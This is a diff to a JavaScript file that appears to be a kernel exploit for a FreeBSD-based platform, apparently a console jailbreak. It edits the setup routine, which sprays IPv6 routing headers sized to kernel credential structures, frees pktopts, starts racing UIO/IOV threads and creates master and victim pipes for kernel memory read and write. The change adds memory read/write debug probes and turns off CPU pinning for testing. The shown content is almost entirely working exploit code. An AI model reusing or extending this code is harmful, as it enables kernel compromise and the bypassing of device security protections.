@@ -782,136 +782,138 @@ function kwriteSlow(addr, buffer) {
 
 function performSetup() {
    try {
-      log("=== START PERFORM SETUP ===");
+      
+        const testBuf = new Buffer(16);
+        log("testBuf created:", testBuf);
+        log("testBuf.size:", testBuf.size);
+        log("testBuf.addr:", testBuf.addr);
+        log("testBuf.addr type:", typeof testBuf.addr);
         
-        log("1. Initializing worker states");
+      
+        if (testBuf.addr) {
+            log("testBuf.addr.lo:", testBuf.addr.lo);
+            log("testBuf.addr.hi:", testBuf.addr.hi);
+            log("testBuf.addr.write8 exists:", typeof testBuf.addr.write8);
+            log("testBuf.addr.read8 exists:", typeof testBuf.addr.read8);
+        } else {
+            log("ERROR: testBuf.addr is null/undefined!");
+        }
+        
+     
+        log("=== TRYING SINGLE WRITE ===");
+        try {
+            testBuf.addr.write8(0, 0x42);
+            log("Single write succeeded");
+        } catch (e) {
+            log("Single write FAILED:", e);
+        }
+        
+ 
+        log("=== TRYING SINGLE READ ===");
+        try {
+            const val = testBuf.addr.read8(0);
+            log("Single read succeeded, value:", val, "hex:", val ? val.toString(16) : "null");
+        } catch (e) {
+            log("Single read FAILED:", e);
+        }
+        
+      
+        log("=== TRYING MEM DIRECTLY ===");
+        try {
+            mem.write8(testBuf.addr, 0x43);
+            log("mem.write8 succeeded");
+            
+            const val2 = mem.read8(testBuf.addr);
+            log("mem.read8 succeeded, value:", val2, "hex:", val2 ? val2.toString(16) : "null");
+        } catch (e) {
+            log("mem operations FAILED:", e);
+        }
+        
+        
+       
+        log("Initializing worker states");
         iovState = new WorkerState(IOV_THREAD_NUM);
         uioState = new WorkerState(UIO_THREAD_NUM);
         
-        log("2. Building spray buffer");
+        log("Building spray buffer");
         sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
-        log("   sprayRthdrLen =", sprayRthdrLen);
         
-        log("3. Preparing msg buffer");
-        log("   msgIov.addr =", msgIov.addr);
-        log("   msgIov.address() =", msgIov.address());
+        log("Preparing msg buffer");
         msg.putLong(0x10, msgIov.address());
         msg.putLong(0x18, MSG_IOV_NUM);
-        log("   msg buffer prepared");
 
-        log("4. Filling dummy buffer");
-        log("   dummyBuffer.size =", dummyBuffer.size);
-        log("   dummyBuffer.addr =", dummyBuffer.addr);
+        log("Testing dummyBuffer properties");
+        log("dummyBuffer:", dummyBuffer);
+        log("dummyBuffer.size:", dummyBuffer.size);
+        log("dummyBuffer.addr:", dummyBuffer.addr);
         
-        dummyBuffer.fill(0x41);
+        log("Filling dummy buffer with 0x41");
         
-        log("5. Reading back dummy buffer");
-        const b0 = dummyBuffer.read8(0);
-        const b1 = dummyBuffer.read8(1);
-        const b2 = dummyBuffer.read8(2);
-        log("   dummyBuffer first bytes:", b0.toString(16), b1.toString(16), b2.toString(16));
+       
+        const fillByte = 0x41;
+        for (let i = 0; i < Math.min(10, dummyBuffer.size); i++) {
+            try {
+                dummyBuffer.addr.write8(i, fillByte);
+                if (i < 3) log("Wrote byte", i, "successfully");
+            } catch (e) {
+                log("ERROR writing byte", i, ":", e);
+                break;
+            }
+        }
         
-        log("6. Setting up UIO IOV buffers");
-        log("   dummyBuffer.address() =", dummyBuffer.address());
+        log("Reading back bytes");
+        for (let i = 0; i < 3; i++) {
+            try {
+                const val = dummyBuffer.addr.read8(i);
+                log("Byte", i, "=", val ? val.toString(16) : "null/undefined");
+            } catch (e) {
+                log("ERROR reading byte", i, ":", e);
+            }
+        }
+        
+  
+        log("Setting up UIO IOV buffers");
         uioIovRead.putLong(0, dummyBuffer.address());
         uioIovWrite.putLong(0, dummyBuffer.address());
-        log("   UIO IOV buffers set");
         
-        log("7. Getting current CPU core");
-        try {
-            const testMask = new Buffer(0x10);
-            log("   testMask created, size =", testMask.size);
-            log("   testMask.addr =", testMask.addr);
-            
-            log("   Calling get_cpu_affinity...");
-            get_cpu_affinity(testMask);
-            log("   get_cpu_affinity returned");
-            
-            log("   Reading mask value with mem.read32...");
-            const maskValue = mem.read32(testMask.addr);
-            log("   CPU mask value:", maskValue.toString(16));
-            
-            previousCore = get_core_index(testMask);
-            log("   Current core:", previousCore);
-        } catch (e) {
-            log("   ERROR getting current core:", e);
-            log("   Stack:", e.stack);
-            previousCore = -1;
-        }
+     
+        log("Skipping CPU affinity and realtime priority for testing");
+        previousCore = -1;
         
-        log("8. Setting CPU affinity to core 4");
-        try {
-            const core4Mask = new Buffer(0x10);
-            log("   core4Mask.addr =", core4Mask.addr);
-            
-            log("   Writing mask value...");
-            core4Mask.write32(0, 1 << 4);
-            log("   Mask value written");
-            
-            log("   Calling cpusetSetAffinity...");
-            cpusetSetAffinity(core4Mask);
-            log("   CPU affinity set successfully");
-        } catch (e) {
-            log("   ERROR setting CPU affinity:", e);
-            log("   Stack:", e.stack);
-        }
-
-        log("9. Setting realtime priority");
-        try {
-            log("   Creating rtprio buffer...");
-            const _rtprio = new Buffer(4);
-            log("   _rtprio.addr =", _rtprio.addr);
-            
-            log("   Writing type and prio...");
-            _rtprio.write16(0, 2);
-            _rtprio.write16(2, 256 & 0xFF);
-            log("   Values written");
-            
-            log("   Calling rtprio_thread syscall...");
-            sysi("rtprio_thread", 1, 0, _rtprio.addr);
-            log("   Realtime priority set successfully");
-        } catch (e) {
-            log("   ERROR in setRealtimePriority:", e);
-            log("   Stack:", e.stack);
-        }
-        
-        log("10. Creating socket pairs");
+        log("Creating socket pairs");
         uioSs = new Int32Array(2);
         socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
         uioSs0 = uioSs[0];
         uioSs1 = uioSs[1];
-        log("    UIO sockets:", uioSs0, uioSs1);
    
         iovSs = new Int32Array(2);
         socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
         iovSs0 = iovSs[0];
         iovSs1 = iovSs[1];
-        log("    IOV sockets:", iovSs0, iovSs1);
 
-        log("11. Creating threads");
+        log("Creating IOV threads");
         for (let i = 0; i < IOV_THREAD_NUM; i++) {
             iovThreads[i] = new IovThread(iovState);
             iovThreads[i].start();
         }
+
+        log("Creating UIO threads");
         for (let i = 0; i < UIO_THREAD_NUM; i++) {
             uioThreads[i] = new UioThread(uioState);
             uioThreads[i].start();
         }
-        log("    Threads created");
 
-        log("12. Creating IPv6 sockets");
+        log("Creating IPv6 sockets");
         for (let i = 0; i < ipv6Socks.length; i++) {
             ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
         }
-        log("    IPv6 sockets created");
 
-        log("13. Initializing pktopts");
+        log("Initializing pktopts");
         for (let i = 0; i < ipv6Socks.length; i++) {
             freeRthdr(ipv6Socks[i]);
         }
-        log("    pktopts initialized");
 
-        log("14. Creating pipes");
+        log("Creating pipes");
         masterPipeFd = new Int32Array(2);
         victimPipeFd = new Int32Array(2);
         
@@ -927,14 +929,12 @@ function performSetup() {
         fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
         fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
         fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);
-        log("    Pipes created and configured");
 
-        log("=== PERFORM SETUP COMPLETED SUCCESSFULLY ===");
+        log("performSetup completed successfully");
         return true;
 
     } catch (e) {
-        log("=== EXCEPTION IN PERFORM SETUP ===");
-        log("Exception:", e);
+        log("Exception during performSetup:", e);
         log("Stack trace:", e.stack);
         return false;
     }
@@ -1589,6 +1589,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
